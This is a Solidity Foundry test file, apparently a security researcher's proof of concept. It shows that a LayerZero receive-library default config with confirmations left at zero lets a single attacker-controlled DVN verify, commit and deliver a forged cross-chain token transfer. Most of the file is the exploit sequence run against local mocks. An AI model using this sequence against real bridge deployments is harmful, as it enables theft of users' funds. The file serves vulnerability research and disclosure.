// SPDX-License-Identifier: MIT
pragma solidity ^0.8.22;
import { TestHelperOz5 } from "@layerzerolabs/test-devtools-evm-foundry/contracts/TestHelperOz5.sol";
import { MintableOFT } from "../src/MintableOFT.sol";
import { MyOFT } from "../src/MyOFT.sol";
import { SendParam, MessagingFee } from "@layerzerolabs/oapp-evm/contracts/oft/interfaces/IOFT.sol";
import { OptionsBuilder } from "@layerzerolabs/oapp-evm/contracts/oapp/libs/OptionsBuilder.sol";
import { ILayerZeroEndpointV2, Origin } from "@layerzerolabs/lz-evm-protocol-v2/contracts/interfaces/ILayerZeroEndpointV2.sol";
import { SetDefaultUlnConfigParam } from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/UlnBase.sol";
import { UlnConfig } from "@layerzerolabs/lz-evm-messagelib-v2/contracts/uln/UlnBase.sol";
import { console2 } from "forge-std/console2.sol";

/// @notice Nomad-pattern test: NOT a per-OApp owner mistake. Governance
/// sets a DEFAULT config with real, legitimate DVNs, but simply never
/// populates confirmations (Solidity zero-inits it). A completely fresh
/// OApp that NEVER touches its own config - the single most common,
/// documented usage pattern ("assuming most oapps use default") -
/// silently inherits the dangerous state with ZERO owner action.
contract RealDefaultConfigZeroConfirmations is TestHelperOz5 {
    using OptionsBuilder for bytes;

    MintableOFT srcOft;
    MyOFT dstOft;
    uint32 aEid = 1;
    uint32 bEid = 2;
    address GOVERNANCE;
    address OWNER = address(0x1111);
    address ATTACKER = address(0xDEAD);

    function setUp() public override {
        super.setUp();
        setUpEndpoints(2, LibraryType.UltraLightNode);
        vm.deal(OWNER, 100 ether);
        vm.deal(ATTACKER, 100 ether);

        srcOft = new MintableOFT("SrcOFT", "SOFT", address(endpoints[aEid]), OWNER);
        dstOft = new MyOFT("DstOFT", "DOFT", address(endpoints[bEid]), OWNER);
        vm.prank(OWNER); srcOft.setPeer(bEid, bytes32(uint256(uint160(address(dstOft)))));
        vm.prank(OWNER); dstOft.setPeer(aEid, bytes32(uint256(uint160(address(srcOft)))));

        srcOft.testMint(ATTACKER, 1000 ether);
    }

    function test_NOMAD_PATTERN_GovernanceDefaultZeroConfirmations() public {
        ILayerZeroEndpointV2 bEndpoint = ILayerZeroEndpointV2(address(endpoints[bEid]));
        (address receiveLib, ) = bEndpoint.getReceiveLibrary(address(dstOft), aEid);

        // Find the REAL owner of the receive library (governance role).
        // In our real, cloned devtools setup, this is TestHelperOz5
        // itself (deployer of the mock infrastructure).
        GOVERNANCE = address(this);

        // GOVERNANCE sets up a NEW EID pathway's default config: real,
        // legitimate DVN requirements, but the confirmations field is
        // simply NEVER populated - left at its Solidity zero-default,
        // exactly matching a real-world "forgot to set this field"
        // tooling/operational oversight, not a deliberate choice.
        address[] memory req = new address[](1);
        req[0] = ATTACKER; // acting as the legitimately-configured DVN for this test

        UlnConfig memory defaultConfigMissingConfirmations = UlnConfig({
            confirmations: 0, // NEVER EXPLICITLY SET - Solidity zero-default
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: req,
            optionalDVNs: new address[](0)
        });

        SetDefaultUlnConfigParam[] memory defaultParams = new SetDefaultUlnConfigParam[](1);
        defaultParams[0] = SetDefaultUlnConfigParam({eid: aEid, config: defaultConfigMissingConfirmations});

        console2.log("GOVERNANCE setting default config for EID 1: real DVNs, confirmations field left at 0...");

        (bool success, bytes memory returnData) = receiveLib.call(
            abi.encodeWithSignature("setDefaultUlnConfigs((uint32,(uint64,uint8,uint8,uint8,address[],address[]))[])", defaultParams)
        );

        if (!success) {
            console2.log("setDefaultUlnConfigs call failed - investigating reason...");
            if (returnData.length >= 4) {
                console2.logBytes4(bytes4(returnData));
            }
            revert("setDefaultUlnConfigs failed unexpectedly");
        }
        console2.log("GOVERNANCE default config accepted with confirmations=0, NO REVERT, NO WARNING.");

        // The CRITICAL point: dstOft NEVER calls setConfig on itself AT
        // ALL. Zero owner action. It relies ENTIRELY on the default
        // governance just set.
        console2.log("dstOft (victim) NEVER touches its own config - relying entirely on governance default...");

        bytes memory options = OptionsBuilder.newOptions().addExecutorLzReceiveOption(200000, 0);
        SendParam memory sp = SendParam({
            dstEid: bEid, to: bytes32(uint256(uint160(ATTACKER))),
            amountLD: 1000 ether, minAmountLD: 0, extraOptions: options, composeMsg: "", oftCmd: ""
        });
        vm.prank(ATTACKER);
        MessagingFee memory fee = srcOft.quoteSend(sp, false);
        vm.prank(ATTACKER);
        srcOft.send{value: fee.nativeFee}(sp, fee, ATTACKER);

        bytes32 senderKey = bytes32(uint256(uint160(address(srcOft))));
        bytes memory sendMessage = abi.encodePacked(bytes32(uint256(uint160(ATTACKER))), uint64(1000 ether / 1e12));
        bytes memory packetHeader = abi.encodePacked(uint8(1), uint64(1), aEid, senderKey, bEid, bytes32(uint256(uint160(address(dstOft)))));
        bytes32 guid = keccak256(abi.encodePacked(uint64(1), aEid, senderKey, bEid, bytes32(uint256(uint160(address(dstOft))))));
        bytes32 payloadHash = keccak256(abi.encodePacked(guid, sendMessage));

        console2.log("ATTACKER (as the legitimately-configured DVN) attests at confirmations=1, the shallowest possible depth...");
        vm.prank(ATTACKER);
        (bool verifyOk, ) = receiveLib.call(abi.encodeWithSignature("verify(bytes,bytes32,uint64)", packetHeader, payloadHash, uint64(1)));
        require(verifyOk, "verify failed");

        vm.prank(ATTACKER);
        (bool commitOk, ) = receiveLib.call(abi.encodeWithSignature("commitVerification(bytes,bytes32)", packetHeader, payloadHash));

        console2.log("=== GROUND TRUTH ===");
        if (commitOk) {
            console2.log("!!!!! CONFIRMED: PASSIVE, NOMAD-PATTERN VULNERABILITY - zero owner action required !!!!!");
            vm.prank(ATTACKER);
            bEndpoint.lzReceive(Origin({srcEid: aEid, sender: senderKey, nonce: 1}), address(dstOft), guid, sendMessage, "");
            console2.log("Real destination balance:", dstOft.balanceOf(ATTACKER));
        } else {
            console2.log("commitVerification failed - hypothesis does not hold at this step.");
        }
    }
}
